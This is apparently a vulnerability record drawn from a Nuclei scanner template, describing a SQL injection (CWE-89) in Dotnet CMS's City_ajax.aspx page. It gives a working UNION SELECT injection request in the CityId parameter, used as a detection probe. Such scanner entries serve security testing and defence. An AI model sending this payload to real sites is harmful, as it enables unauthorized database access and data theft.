# Vulnerability: Dotnet CMS - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`dotnetcms-sqli.yaml`)

## Description
Dotnet CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/user/City_ajax.aspx?CityId=33'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{randstr}}')),2--
```

